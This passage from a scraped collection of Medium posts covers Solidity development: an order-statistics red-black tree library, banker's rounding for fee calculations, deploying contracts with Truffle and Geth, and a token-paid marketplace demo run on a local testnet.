\u00b7 10 min readPhoto by Luke Chesser on UnsplashThis should not be a first choiceThis post is about what we can do when we\u2019ve exhausted all of the alternatives.I\u2019ve written before that sort order can almost always be handled outside Ethereum Smart Contracts: The Joy of minimalism in Smart Contract Design.And, I\u2019ve written before about patterns for efficiently organizing data in unordered lists. Solidity CRUD.Thanks to mappings, there is usually no need to \u201csearch\u201d to find records of interest in a Solidity contract. It follows that a principle reason for sorting records, namely finding them again, is generally not a sound justification for the increased cost and complexity of sorting records.In many cases, sorted and filtered data is interesting to software-clients. But, since software-clients are well-capable of sorting the information themselves, that too is a poor justification for burdening a smart contract with the heavy lifting of sorting a list.Many statistics such as lowest, highest, average and moving average can be computed on-the-fly without resorting to sorting the data. Those, too, are poor justifications for sorting a list in an Ethereum smart contract.If contracts only need to find previous and next records and enumerate them in sorted order, a linked list is a simple pattern. When combined with hints about where to start, insertion cost can be scale-invariant. That\u2019s what we want because anything that gets more expensive as the set expands is probably a serious defect: Getting Loopy with Solidity.We should always prefer an efficient workaround over the considerably more complex idea of sorting a list.There are cases, however, where the sort order is important to a contract and none of the aforementioned tools are right for the job.What if a contract needs to know the median value in a set? Or, the rank of a given value? Or, the value at a certain rank? For example, consider test scores graded on a curve. Suppose everyone in the top 10% of the sorted test results is to get an A+ and the contract logic (a prize, perhaps?) depends on this result. And, suppose this requirement needs to be handled by a contract. An Oracle is a possibility, but what if the implied return to centralization isn\u2019t acceptable?Intuitively, we can see that such a process is both simple and deterministic. A smart contract ought to be able to do it. But, such calculations may depend on a sorted list and the kind of random access that a linked list doesn\u2019t excel at.Cases like this call for a general-purpose and efficient sorting solution.This is a non-trivial undertaking and the alternatives mentioned are better-suited to Ethereum if they can be applied successfully.ChallengesI believe Nick Johnson first starting talking about amortization of work in smart contracts. The idea is to take processes that would cost too much gas if tackled all once and break them down into smaller tasks that can be completed individually on a limited gas budget. Some extra difficulty comes from the need to ensure the contract state is valid at all times even when the overall process in only partially complete.If we\u2019re going to deal with sorted lists, then it would be a good idea to deal with lists that are sorted at all times rather than a monolithic process that sorts a completely disarranged set. A Binary Search Tree is such a structure.I won\u2019t cover the details here. In summary, BSTs maintain an ordered list by maintaining a set of pointers as data is added and removed.BSTs offer certain assurances. For example, in a \u201cperfectly balanced\u201d tree, any record can be found in O(log n) steps. In a set of 1,024 records, one can find any record in, at most, 10 steps because 2**10 is 1,024. Each node is a sorted value with up to two child nodes, usually called left and right. Left points to something smaller, and right points to something larger. This is the \u201ctree\u201d aspect of the structure.\u201cPerfectly balanced\u201d means that any node in the tree has an ~equal (+/- 1) number of children on the left and right side, so the search algorithm can reduce the search area by half with each step. This is the \u201cbinary\u201d aspect of a BST. Achieving and maintaining this balance is accomplished by re-organization during inserts and deletes. (Modification is a delete followed by an insert).When everything is organized like this, it is always possible find an empty node where new data can be inserted while maintaining the searchable aspect of the tree. Re-organization for tree balance is always possible with a little rearranging of node positions. However, remember O(log n). Execution cost increases as the tree gets bigger. And, balancing adds steps to the insertion and removal processes.This arrangement is not optimized for the economics of Ethereum smart contracts. Smart contract costs are heavily weighted toward write operations, so it doesn\u2019t make a lot of sense to perfectly optimize read-back efficiency while disregarding the cost of frequent, intricate reorganization.Rising transaction costs as the tree grows is a serious concern for Ethereum smart contracts because it implies that the cost of using the contract might increase to the point of being impractical or even impossible to use. When the gas cost exceeds the block gas limit it\u2019s not possible to run a transaction even if one is willing to pay for it. That\u2019s usually unacceptable.On the other hand, a \u201csignificantly imbalanced\u201d tree is also unacceptable. It defeats the purpose of using a BST and we would end up with costs comparable to iteration through a linked list.We need some sort of compromise.Red Black TreeA Red Black Tree is a variant of a BST that reduces update costs by tolerating limited imbalance in the tree. Such a tree can be a little lopsided, but not too much. It\u2019s still possible to reason about the maximum cost in the worst-case scenario. Tolerating limited imbalance significantly reduces the frequency and extent of necessary reorganizations.Cost still increases with size, but at a reduced rate of increase. We get most of the benefits of a balanced tree at significantly reduced update cost.This is progress, but \u2026What we really need is fixed maximum cost, so we can be sure that it will always be possible to use the contract, at a reasonable cost.Finite Trees for Infinite SetsReturning to the purpose of sorting in the first place, there are problems that can be solved with imperfect sorting. Finding the records in the top 10% is such a case. Tolerating less-then-perfect sorting will be key to ensuring it\u2019s possible to calculate a fixed cost for the worst-case scenario on a set of unlimited size.Let us consider the question of pinpointing the value (say \u2026 test score) at a precise percentile rank. Let\u2019s say we want the 90th percentile of 100,000 test scores in the range of 0/50 to 50/50.A na\u00efve way to approach this would be to consider just sorting the results, implying a BST with 100,000 nodes. We can see right away this is probably too expensive and subject to failure due to the gas cost of insertion and deletion into any sort of tree structure. Do we really need to do that?Perhaps surprisingly, we could accomplish our goal with a tree of 51 nodes.Each node will be the set of test scores with a certain grade. The range of possible scores is 0\u201350, so at most there will be 51 unique grades. There will be thousands of records that share the same grade, but that\u2019s not important. By definition, they also share the same rank.The point is that we don\u2019t need to sort the 100,000 test scores, only the 51 unique possible values. We can treat each unique value as a set that contains many results from many instances (student test results). We will need to know how many such instances exist at each node so we can figure out how many instances exist above and below, so we can figure out the rank.For emphasis, we don\u2019t need to sort the tests with the same result, at all.Each node contains the unordered set of instances that share the same sorted value and the count of the instances that exist in the subtree starting at that node. Illustration adapted from image at https://en.wikipedia.org/wiki/Red%E2%80%93black_treeWhat if we want more precision?Suppose we have values in the range of 1\u20135,000,000 (and lots of them) and we want to be able to pinpoint the rank, percentile, median, etc., to three significant digits of accuracy. The node count has nothing to do with the number of instances to sort or even the range of the sorted values. It\u2019s the number of unique values to sort that matters.We could scale and round the values to guarantee that there can never possibly be more than 1,000 nodes in the tree and to ensure that we don\u2019t pay for sorting beyond the precision we actually need.We don\u2019t need to sort similar values with the same result, at all.Each node in the tree contains the set of instances with approximately equal values. These are treated as an unordered set.Limiting Tree Size is key to establishing a maximum update cost. It means there will always be a calculable cost for the worst-case scenario.\u201dWe know that we can maintain an unordered set in each node using the Solidity CRUD pattern, so \u2026If we have maximum tree maintenance cost coupled with maximum set maintenance cost, then we have sorted (enough) lists with maximum gas costs at any scale.Photo by Zolt\u00e1n Cse on UnsplashBingo. We can work with that. A BST with a known insertion and deletion cost at any scale is appropriate for Ethereum.You can put as many instances as you want into such a structure and it will never exceed the predetermined maximum gas cost.FIFO method of limiting tree size.For something like a reputation system, it might suffice to limit the tree to n recent records by ejecting the oldest first when a limit is exceeded.The method of limiting the overall tree size is flexible. Just don\u2019t skip it. Before you use this structure, you should be able to show how your overall design imposes an upper bound on the tree size.Order Statistics TreeAn Order Statistics Tree is a BST with nodes that contain a count. The count tallies the number of instances in the subtrees that start at each node. This makes it possible to efficiently (cheaply) work out the number of instances above and below any position. When you have above and below counts, you have rank. When you have the rank of a given value and the records at each level, you can enumerate all the records in the top 10% which is what we wanted to do.A contract can see things like the fact that there are 37 records in the 65\u201370th percentile and it can enumerate them.In the linked implementation, unordered lists with insert and delete logic (See Solidity CRUD) contain the identifiers of all the instances that share the sorted value of a given node. It\u2019s a self-balancing tree that uses the Red Black Tree re-balancing algorithm. That\u2019s everything we need for a potpourri of handy tree exploration and statistical functions.The tree size limiting process is intentionally left out for maximum flexibility. Two ideas, precision and FIFO are described above. More are contemplated. You have flexibility here. Use any strategy you like as long as the gas cost is acceptable at your maximum possible tree size.Other Statistics TreeThe example implementation gets a lot of mileage out of maintaining a count at the node level. A similar approach can be applied to all sorts of statistics about the sets.For example, consider an order book where the product of bid and volume is interesting. If each node contains a sum of bid x volume in the subtree at the node, then it would be just as fast (and cheap) to work out market depth above and below any price. Could that be interesting to a contract? The process and the algorithm that maintains the structure can probably be applied to a number of statistics that haven\u2019t even been considered.A word of caution: This is a non-trivial library that has not been audited. You should consider it experimental and remember that it is presented without warranty of any kind. You are advised that you should not use it or any variation of it in a production contract without first publicly disclosing your quality-assurance process, code audits, test plan and bug bounty. You use it at your own exclusive risk.Feedback and contributions are welcomed with gratitude.The code: https://github.com/rob-Hitchens/OrderStatisticsTreeHere\u2019s a peek at the functions in the library:using HitchensOrderStatisticsTreeLibrary for ... Library.TreeHitchensOrderStatisticsTreeLibrary.Tree tree;function snippet() public {        uint value;       // inspecting by value        uint row;         // inspecting instances of value, by row        uint _rank;       // inspecting by rank        uint _percentile; // inspecting by percentile        uint root = tree.root;        uint frst = tree.first();        uint last = tree.last();        uint next = tree.next(value);        uint prev = tree.prev(value);        bytes32 key = tree.valueKeyAtIndex(value,row);        bool vexs = tree.exists(value);        bool kexs = tree.keyExists(key, value);        uint cont = tree.count();        uint pctl = tree.percentile(value);        uint prml = tree.permil(value);        uint atpc = tree.atPercentile(_percentile);        uint atpm = tree.atPermil(value);        uint medn = tree.median();        uint rank = tree.rank(value);        uint belw = tree.below(value);        uint abov = tree.above(value);        uint atrk = tree.atRank(_rank);        // Insert and Remove key/value pairs        tree.insert(key, value);        tree.remove(key, value);    }Shout out to Bokky Poobah who was first to release a Solidity Red Black Tree implementation upon which the Order Statistics Tree is constructed.Rob Hitchens is a Canadian smart contract design consultant, co-founder of Ethereum smart contract auditor Solidified.io and a courseware co-author and instructor of Ethereum, Hyperledger Fabric, Hyperledger Sawtooth Lake, Corda and Quorum bootcamps by B9lab.", "responses": 0, "tags": ["Ethereum", "Solidity", "Data Storage", "Smart Contracts", "Data Structures"]}, {"title": "\u201cBankers Rounding\u201d for Smart Contracts", "post_link": "https://medium.com/hackernoon/bankers-rounding-for-smart-contracts-2bccd0b664?source=search_post", "author_name": "Anthony Akentiev", "author_link": "https://medium.com/@AnthonyAkentiev", "publish_date": "2019-03-26", "last_modified_date": "2019-03-26", "readtime": "2.55", "claps": 64, "voters": 5, "content": "\u201cBankers Rounding\u201d for Smart ContractsAnthony AkentievFollowMar 26 \u00b7 3 min readHello everyone! My name is Anton, and I\u2019m the CTO at crypto.tickets. Crypto Tickets has developed the new decentralized ticketing protocol that protects tickets from being counterfeited or double sold. The appeals of Crypto Tickets for event organizers are the abilities to control the secondary market, retain extra commissions on every ticket resale, prohibit resales entirely, or allow resales only for authorized fans. This technology is designed to be an add-on for any ticket selling technology on the market.Integers?As you know, Ethereum smart contracts can\u2019t handle real (floating point) numbers easily. So, we all work with integers.Still, if you work with percentages, you will have to divide one number by another. That\u2019s where rounding comes in. For example, imagine you need to send \u201c13% as dividends\u201d to the account A. What if you have 10 tokens to split? Should you round 1.3 tokens to 1 or 2? It\u2019s obvious that 1.3 should be rounded to 1. It\u2019s high school math, nothing interesting.There are common approaches to dealing with real numbers in smart contracts. Some store the numerator and denominator as separate variables so you can describe 1/3 by storing 1 in the numerator and 3 in the denominator, but that\u2019s a different story for another time.The story begins when you have to round 1.5. What if we always round it to 1? Your system will accumulate the error and your investor will ALWAYS loose dividends. If you round it to 2, you will ALWAYS lose money. Imagine you send dividends millions of times. Is there any way we can reduce the accumulated error?Bankers are not necessarily always against the whole society. They have something that we can use called \u201cbankers rounding,\u201d aka \u201cround-half-to-even\u201d. The idea is that when a number is halfway between two others, it is rounded toward the nearest even number. For instance, 2.125 rounds down to 2.12. Meanwhile, 2.135 rounds up to 2.14. Other decimal fractions are rounded according to the same method: 2.122 to 2.12, 2.127 to 2.13, -2.122 to -2.12, etc. So, you won\u2019t ALWAYS lose money, just like your client.https://en.wikipedia.org/wiki/RoundingOk, let\u2019s introduce that function to the cryptocurrency world!In crypto.tickets we use smart contracts for accounting (We call it \u201cbilling\u201d), so when the ticket is resold on the secondary market, the event organizer receives 50% of the markup as a fee. Let\u2019s describe how and where we use bankers rounding.Let feeOrg_ppm store the number of dividend ppms the event organizer should receive. Ppm stands for parts-per-million, so 1% is 10000 ppm. Eventually, feeOrg_ppm will be equal to 50000.Let markup_cents store the current markup, for example, 14 cents.To calculate how much the organizer should receive, we use this simple formula:That\u2019s where the bankersRoundedDiv() method comes in:If markup_cents is 14, then the event organizer will receive 7 cents.If markup_cents is 15, then the event organizer will receive 8 cents (7.5 is rounded to the nearest even number).If markup_cents is 17, then the event organizer will receive 8 cents (8.5 is rounded to the nearest even number which is still 8).\u201cBankers Rounding\u201d CodeThe code is available here \u2014 https://github.com/cryptoticket/openzeppelin-solidity/blob/master/contracts/math/RoundedDivMath.sol#L53Tests are available here \u2014 https://github.com/cryptoticket/openzeppelin-solidity/blob/master/test/math/RoundedDivMath.test.jsConclusionRound-half-to-even helps you minimize the accumulated error, so your client will be happy when receiving fees or dividends.Feel free to contact me: tony@crypto.tickets", "responses": 0, "tags": ["Ethereum", "Solidity", "Smart Contracts", "Bankers Rounding", "Blockchain"]}, {"title": "Ethereum \u00d0Apps Programming Distilled \u2014 Part 3", "post_link": "https://medium.com/@mbellinaso/ethereum-dapps-programming-distilled-geth-mist-truffle-deploy-smart-contract-aee26d410b14?source=search_post", "author_name": "Marco Bellinaso", "author_link": "https://medium.com/@mbellinaso", "publish_date": "2018-03-06", "last_modified_date": "2018-06-18", "readtime": "6.23", "claps": 55, "voters": 4, "content": "Ethereum \u00d0Apps Programming Distilled \u2014 Part 3Creating the backend of a decentralised app: using Geth, Mist or Truffle to deploy a Smart Contract.Marco BellinasoFollowMar 6, 2018 \u00b7 7 min readThis is a multi-part article. Here are the links to the other parts:Part 1: What is a blockchain and how does it work?Part 2: What\u2019s special about Ethereum, and how to write a Smart Contract with Solidity?Part 4: Creating and deploying the frontend with HTML, JS, Web3 and MetaMaskPart 5: Publishing live, on either the Ropsten testnet or on the mainnetWhat is a decentralised app, and how is it composed?A decentralised app, or \u00d0App, is simply the combination of:One or more Ethereum Smart Contracts (hosted on the blockchain) that contain some executable business logic.The use of the blockchain to store any new data.An HTML frontend, hosted on a typical web server.In reality to be fully decentralised the frontend should also be hosted in a decentralised way rather than being on Azure, AWS, GitHub Pages or on any other traditional hosting\u2026and that will likely be the evolution of Ethereum, but we\u2019re not there yet. Swarm (decentralised file storage) and Whisper (decentralised messaging) are two other technologies, complementary to Ethereum, that will allow to build fully decentralised applications, but they are only in alpha at the moment, and therefore not finished/reliable/usable for anything real.Creating and deploying the backend: the traditional way and the easier wayAfter you\u2019ve written your Smart Contract in Solidity, like in the previous example, you\u2019ll want to deploy it to the blockchain and start playing with it to see if it runs and does what you want. Since deploying a contract means saving it to the blockchain, and because that consumes storage and computation, it would cost you real ETH and therefore real fiat currency if you deployed it to the live/production blockchain (called \u201cmainnet\u201d). But you certainly don\u2019t want to do that until you\u2019re sure that everything\u2019s fine and ready for prime time. Fortunately, in addition to the mainnet there are multiple testnets (Ropsten, Kovan and Rinkeby \u2014 more about their differences here): these are still real blockchains, deployed on a network of nodes, that the community agreed to support to have test environments for developers. The difficulty for mining blocks is easier, and ETH is free on them (you can mine them yourself or, better, use a \u201cfaucet\u201d like this one for Ropsten and this one for Rinkeby). Deploying here is great, because while being free it still allow the developer to work in real distributed blockchain, where there\u2019s latency etc.However\u2026before deploying to a distributed testnet there\u2019s something even simpler, which is creating your own private development blockchain, only stored on your dev machine. What you would normally do is create a dedicated folder somewhere, a special file that represents a genesis block (i.e. the first block of the chain) and run the Geth client to start mining a chain there.After you\u2019ve got a local and private blockchain you do the following:1. Compile your Smart Contract with the Solidity Compiler (solcjs), or use the browser-based Remix IDE, which gives you a fairly easy UI for compiling, running and debugging your code (but nothing fancy, don\u2019t try to compare to other real IDEs\u2026). The compilation gives you back 2 things: A) an ABI (Application Binary Interface) file\u2026which contains some json describing the classes and functions of your contract (the public interface, in fact).B) a BIN (binary) file that contains the compiled bytecode, which is what you deploy.2. Deploy the contract on the private blockchain with Geth from the command line. Alternatively you can do it more easily from a GUI thanks to the Mist Browser (which includes Geth btw, so you could have downloaded directly this). Mist is a browser for Dapps, and allows you to create and manage accounts and wallets, and use any application available on Ethereum. It allows you to upload a new contract, and even dynamically creates a UI to interact with it by calling functions to read data and send transactions to modify data. As you might have guessed it, the Smart Contract\u2019s ABI is used to discover what are the functions exposed by the contract and what inputs/outputs they have, so that a UI can be generated for them automatically. Regardless of the method you use, after deploying the contract you\u2019ll receive the address of where the contract has been deployed, which you later use to invoke it from the frontend part of the dapp (see next section).Image taken from this article by Pete Humiston, which explains how to install, configure and run Geth and Mist step by step, and use them to deploy a contract.If all the above sounds like fun, go ahead, do it and have fun. But because I\u2019m lazy, and because there are nice people building tools and helpers for lazy people like me, I\u2019ve instead used the Truffle Suite for my app. Truffle is described as \u201cYour Ethereum Swiss army knife. Truffle is the most popular development framework for Ethereum with a mission to make your life a whole lot easier.\u201d and at least at the moment they are right. Here\u2019s a quick overview of how to use it:Install it with \u201cnpm install -g truffle\u201d.Move into your project folder and run \u201ctruffle init\u201d to create a bare Truffle project. Then move your Smart Contrat\u2019s .sol files (if you\u2019ve written them already) into the \u201ccontracts\u201d subfolder, and add a reference to them into the \u201cmigrations\u201d folder (I\u2019m skipping a few details here, but refer to their tutorial for the full thing.)Run \u201ctruffle compile\u201d to compile the project.Run \u201ctruffle develop\u201d to launch a \u201cdevelopment console\u201d. This command also uses Ganache (another tool included in the Truffle suite) to automatically create a private dev blockchain and 10 accounts (public/private keys) to use in your tests.From the console run \u201cmigrate\u201d. Done, your contract is now deployed to your private blockchain. All in a few minutes, not bad! If you modify the contract\u2019s code, simply run \u201cmigrate \u2014 reset\u201d to recompile and then immediately redeploy it.From the console you can also write javascript to interact with the deployed contract. Say that you\u2019ve deployed a contract called SimpleStorage, with a function called setValue that takes in input a string and stores it as part of its state\u2026here is how you\u2019d invoke it from the console:SimpleStorage.deployed().then(  function(instance){return instance.setValue(\"hello\");});See the next section about the frontend for a more complete example that uses the actual MessageStorage Smart Contract presented before.What happens if you need to fix/update a contract and redeploy it?This is a very important point indeed! Redeploying the contract means creating a new version of it on the blockchain, on a new address and with a new state. This means that once you deploy a Smart Contract you can no longer fix/change it\u2026it will be immutable\u2026you can only have a completely new one, separate from the previous, it\u2019s not an actual fix/upgrade. So you better debug and fix all bugs before doing so!What if you fail at that, or if you anyway need to add things and evolve the functionalities? There isn\u2019t a unique answer for all scenarios, but there are things you can do: for example in my app, should I need to deploy a new version of the contract, I would retrieve past messages from v1 of the contract, and save/load new messages from v2. Bigger apps that are composed by multiple contracts might use a smart contract as a \u201cgateway/proxy\u201d for functionalities implemented by other separate contracts \u2014 this proxy could have functions (only usable by the owners) to change the address of the sub-contracts it points to. So if proxyContract uses storeContractV1 deployed at 0x123, and you need to fix storeContract, you might call a function like proxyContract.setStoreContract(address_for_storeContractV2) that changes the address of storeContract in a variable held by proxyContract. Of course in order to be able to do this 1) the public interface of storeContract must be the same between v1 and v2, and 2) you must appropriately structure the code (and create the setStoreContract() function) before the initial release. This article by Jack Tanner explains this and other approaches with more details.NOTE: if you wanted to make sure previous versions of your contracts are no longer accessible, you\u2019d need to implement a function (call it \u201ckill\u201d or something similar, and make sure it has the onlyOwner modifier defined by the Ownable contract!) that calls selfdestruct as shown in the official docs.Next part: Part 4: Creating and deploying the frontend with HTML, JS, Web3 and MetaMaskWho am I / what do I do? I proudly work as a Solutions Architect in the Mobile Team @ ASOS.com (iOS app | Android app), and we\u2019re always looking for strong, friendly and talented developers that want to have an impact on how tens of millions of customers shop online. ASOS is the biggest online-only retailer in UK and, let\u2019s be real, the best tech+fashion company in the world. Some of the technologies we use are Swift for iOS, Kotlin for Android, React and Node on the web frontend, .NET and Azure on the backend. If that sounds interesting to you, and you happen to live in beautiful London (or are willing to move here\u2026after all it\u2019s the best city in Europe except for some in Italy!), do get in touch with me!", "responses": 0, "tags": ["Ethereum", "Dapps", "Solidity", "Blockchain", "Blockchain Development"]}, {"title": "Develop a Marketplace Contract with Token Payment", "post_link": "https://medium.com/coinmonks/developing-a-marketplace-contract-with-token-payment-d865323ea88c?source=search_post", "author_name": "KC Tam", "author_link": "https://medium.com/@kctheservant", "publish_date": "2019-05-19", "last_modified_date": "2019-05-20", "readtime": "9.92", "claps": 6, "voters": 4, "content": "Develop a Marketplace Contract with Token PaymentKC TamFollowMay 19 \u00b7 10 min readIntroductionIn my previous article (link) I have shown the use of dapps.tools in Ethereum contract development, and see how to use dapp and seth to perform unit testing of contract code with a testset, and deploy my contract code in a local testnet.In this article I first create another contract simulating a marketplace. And deployment I will add a token as the payment for items in the marketplace. The token I am using is from ds-token package, which is a mintable ERC20 token. Finally we will demonstrate the execution of contract functions and see how my contract interacts with the token contract.Overview of the ApplicationThe application is a smart contract simulating a marketplace operation. It keeps items listed by someone (seller) at a price tag, and another (buyer) can buy the item by paying that price to the seller. It also comes with some checking functions to see if that item exists or is already sold. Meanwhile the buyer can remove the item from the marketplace provided that the item is not sold to anyone yet.In phase 1 we will complete these functions. In phase 2, we will implement an ERC20 token as the (only) payment method in this marketplace.This application itself by no means a complete one for production, and there are still many to do for tuning and optimization before it is a full function. Nevertheless, this fulfils my purpose to show how to use dapp.tools to build something interesting and add a token using ds-token package.A marketplace application with token paymentPhase 1: Marketplace without Token PaymentCreate a Workspace for this contract. We name the workspace as emarket (directory name). With dapp.tools we will have a predefined contract name Emarket.sol and the associated testing contract Emarket.t.sol.We will look into the two contract files. Then begin to test and deploy the contract on testnet. Finally we will simulate some activities over this deployed contract.Contract: Emarket.solHere is the contract code I am using in this demonstration.The data structure Item keeps the detail of each item posted in the emarket. It contains a description, the seller and the buyer, price, and a boolean whether this item is sold or not. Note that the price is just a number at this stage, and later it will be an amount of token after we implement the token in phase 2.The items is the mapping from an index to the data structure Item. We simply maintain a counter itemCount for counting index.No constructor is needed in this contract. Six functions are defined in this contract.addItem(description, price) is called when a seller lists an item in the emarket. What we need are just a description and the price of that item. This will be recorded as a new item indexed with itemCount+1.getItem(index) is called when anyone wishes to show detail about an item. We will get back the description and price.checkedItemExisting(index) is called when anyone wishes to know whether an item exists or not.checkedItemSold(index) is called when anyone wishes to know whether an item has already been sold.removedItem(index) can only be called by the seller who lists the item before.buyItem(index) is called by a buyer. Buyer can only buy item if it is not sold yet. Currently the logic simply updates the buyer address and marks the sold flag.Test Contract: Emarket.t.solWe have defined four test cases for my emarket contract. They are quite self-explanatory so here we do not provide the detail.Setup WorkspaceWe will have setup our workspace emarket as shown the previous article.mkdir emarketcd emarketdapp initAfter we paste our contract Emarket.sol and the test contract Emarket.t.sol, we can perform the unit test using dapp test.And from the result we know all test cases are passed.Run Testnet and Deploy the ContractAs before, we open another terminal to run a testnet, using dapp testnet. To get two more addresses for demonstration, we can can specify option -- account.We will create the environment variables for demonstration purpose. The first one we use ETH_FROM such that it is the coinbase account. If we do not specify anything it is the default account.export ETH_KEYSTORE=~/.dapp/testnet/8545/keystoreexport ETH_GAS=2000000export ETH_FROM=0x60c5d2e21151275b752627d000428431dde3db07export ALICE=0x56c01aa43dbf31100b7335d9c247adb55d2eecebexport BOB=0x31ba7173a223db36b9d51220ea046a99ea8ae8d4And we deploy the contract using dapp create.Now we have the contract address 0x7e2d\u2026d237. As good practice we use an environment variable to keep this address.export EMARKET=0x7e2daacd18aeda6f8220e542137bff36a40ed237Interacting with the ContractIn this demo we simulate a real life example. This involves the following steps.Check currently no items are in the marketplace yet.Alice lists an item \u201ca pen\u201d and marks the price 100. Check that the item is in marketplace.Bob buys this item. Check that this item is sold and Bob\u2019s address is correctly recorded.Alice tries to remove this item but fails, as this item is already sold.Step 1: First let\u2019s see the current itemCount.seth call $EMARKET \u201citemCount()\u201dStep 2: Alice lists an item.seth send $EMARKET \u201caddItem(string memory, uint)\u201d $(seth \u2014-from-ascii \u201ca pen\u201d) $(seth \u2014-to-uint256 100) --from=$ALICEThen take a look on the itemCount and item #1 detail.seth call $EMARKET \u201citemCount()\u201dseth call $EMARKET \u201citems(uint)(string memory,address,address,uint,bool)\u201d $(seth \u2014-to-uint256 1)We can see there is one item, and we see the description (\u201ca pen\u201d in ascii), seller Alice, and this item not sold yet.Step 3: Now Bob buys this item (item #1).seth send $EMARKET \u201cbuyItem(uint)\u201d $(seth \u2014-to-uint256 1) \u2014 from=$BOBAnd after that we check item #1 again.seth call $EMARKET \u201citems(uint)(string memory,address,address,uint,bool)\u201d $(seth \u2014-to-uint256 1)Now we see the buyer address (Bob\u2019s) recorded, and this item is marked as true (sold).Step 4: Alice tries to remove this item. She cannot as this item was sold already.seth send $EMARKET \u201cremoveItem(uint)\u201d $(seth \u2014-to-uint256 1) \u2014-from=$ALICEPhase 2: Marketplace with Token as Payment MethodsCreate a New WorkspaceWith the basic functions of marketplace ready, we will now include an ERC20 token as the pricing and payment method for this marketplace.To keep things neat, here we create another workspace, namely emarketwithcoinmkdir emarketwithcoincd emarketwithcoindapp initWe are using ds-token package provided in dapp.tools. ds-token is a package of standard ERC20 implementation, plus some additional functions like mint() and burn(). There are some advanced features working with other packages but the basic ERC20 and the mint/burn are good enough for our demonstration.We will first install the package.dapp install ds-tokenAll the required packages required are installed. The package is installed under lib/ds-token.If we inspect the token contracts in lib/ds-token/src/base.sol and lib/ds-token/src/token.sol, we probably see an implementation of ERC20 tokens, and some additional functions. Meanwhile each comes with a unit test contract, and the test are running when the contract is deployed.Modify Our Contract CodeFor simplicity, we only focus on the contract code, and put aside the testing contract code (we see how it works in early sessions). It is not the best practice as we should always use testing contract for unit testing. Nevertheless, we assume our code are good for demonstration.Here is the contract code for Emarketwithcoin.Here I just highlight the additional portion on top of the previous example.1. Import the contract from the ds-token package. Here we import token.sol.import \u201cds-token/token.sol\u201d;If we take a look on the code, token.sol further imports base.sol. And token.sol provides the class DSToken that we will use later. Note the default DSToken comes without a fixed supply and with decimal precision 18. For demonstration purpose we will keep this without considering the actual precision.2. Specify where the token contract is.ERC20 public emark;constructor (address _emark) public {    emark = ERC20(_emark);}Here we define an object emark, which holds the deployed token contract. As a result, in our deployment we first deploy a token contract, and the contract ID of the deployed contract is passed to this contract through constructor. We will see how it works later.3. Transfer tokens when buy an item.function buyItem(uint _index) public {    Item storage i = items[_index];    require(i.seller != address(0), \u201cno such item\u201d); // not exists    require(!i.sold, \u201citem sold already\u201d);    require(i.price <= emark.balanceOf(msg.sender), \u201cnot enough tokens\u201d);    i.buyer = msg.sender;    i.sold = true;    emark.transferFrom(msg.sender, i.seller, i.price);}We add two logics here. First we will check buyer\u2019s balance when he buys a listed item. If balance is not enough the transaction fails. Also we will use transferFrom to transfer tokens from someone who buys this item to the seller of this item. Since it is the Emarketwithcoin contract performs the transferFrom, the buyer needs to approve the Emarketwithcoin contract for the transfer. We will see how it works later.4. Update the test contract (inside Emarketwithcoin.t.sol).function setUp() public {    emarketwithcoin = new Emarketwithcoin(address(0x123));}As we have included constructor and an address is required, we need to modify the Emarketwithcoin.t.sol with a pseudo address for getting through the test. Again we are not defining any test cases and therefore the test address is not meaningful in this case.Deploy Contracts in TestnetToken contract is deployed first as Marketplace requires the Token Contract IDAs before, we open another terminal to run a testnet, using dapp testnet. We also needs two more addresses for demonstration.We will create the environment variables for demonstration purpose. The first one we use ETH_FROM such that it is the coinbase account. If we do not specify anything it is the default account.export ETH_KEYSTORE=~/.dapp/testnet/8545/keystoreexport ETH_GAS=3000000export ETH_FROM=0x631911a584ae91af67efce2adb3d20b5e29b3be5export ALICE=0x2963cb08f690a072b718addbc6478641305f5e69export BOB=0x486e85148d38402bd72a30fea6dcbc7a5cb5f3d8Now we deploy the token contract first. The symbol we pass to the new contract is emark.dapp create DSToken $(seth \u2014-to-bytes32 $(seth \u2014-from-ascii emark))Now we have the token contract ID (or contract address). We will use an environment variable EMK to hold this address.export EMK=0xce13f923964091acb55c4c8fcf5b6f2a3261dda6With this, we can deploy the Emarketwithcoin contract. We specify the token contract ID as required in constructor.dapp create eMarketwithcoin $EMKNow we have another contract ID. We will hold this in environment variable MARKET.export MARKET=0xda99912a9c7a370cd24621f0147f4b13e1d0f830Now we have both contracts deployed.Interacting with the ContractsOur demonstration flow on these deployed contract is simple.Check emark balance of both Alice and Bob, and see no balance at the beginning.Mint Bob 100 emarks. It will be used for buying an item listed by Alice.Alice lists an item with price set to 80 emarks.Bob buys this item.Check emark balance of both Alice and Bob, and we see 80 emarks transferred to Alice.Always remember we have two contracts: EMK for token, and MARKET for marketplace. They are two independent contracts, and the only linkage is that MARKET contract will call EMK when someone buys items.Step 1: We begin with token contract. Check balance of total EMK supply, and balances of Alice and Bob.seth call $EMK \u201ctotalSupply()\u201dseth call $EMK \u201cbalanceOf(address)\u201d $ALICEseth call $EMK \u201cbalanceOf(address)\u201d $BOBInitially all are zero. No emark exists yet.Step 2: We mint 100 emarks to Bob.seth send $EMK \u201cmint(address,uint)\u201d $BOB $(seth \u2014-to-uint256 100)And check the balance. Bob has 100 emarks (0x64) and total emark supply is also 100.Before MARKET can transfer tokens from Bob\u2019s account, Bob needs to approve MARKET that amount. Assuming Bob approves 80 emarks.seth send $EMK \u201capprove(address,uint)\u201d $MARKET $(seth \u2014-to-uint256 80) \u2014-from=$BOBStep 3: We move to the marketplace. Alice lists an item \u201ca pen\u201d and the price is 80 emarks.seth send $MARKET \u201caddItem(string memory, uint)\u201d $(seth \u2014-from-ascii \u201ca pen\u201d) $(seth \u2014-to-uint256 80) \u2014-from=$ALICEAnd we will see the item #1 recorded.seth call $MARKET \u201citems(uint)(string memory,address,address,uint,bool)\u201d $(seth \u2014-to-uint256 1)Item is listed by Alice and now sold yet.Step 4: Bob is buying this item.seth send $MARKET \u201cbuyItem(uint)\u201d $(seth \u2014-to-uint256 1) \u2014-from=$BOBAnd we check the item #1 again.seth call $MARKET \u201citems(uint)(string memory,address,address,uint,bool)\u201d $(seth \u2014-to-uint256 1)The item is sold to Bob.Step 5: Finally we check the total EMK supply and balance of both Alice and Bob again.We see 80 emarks is transferred from Bob to Alice as Bob has bought Alice\u2019s item with 80 emarks. And the total supply remains 100 emarks.ClosingWe have shown a sample marketplace contract (again, not optimized one and not for production). We saw how to use test contract to implement some unit tests on the functions. After deploying on the testnet, we demonstrate how to execute the functions defined in the marketplace. Then we use the same marketplace contract and add token as the pricing and payment method. Using ds-token package and with a few modifications, the marketplace 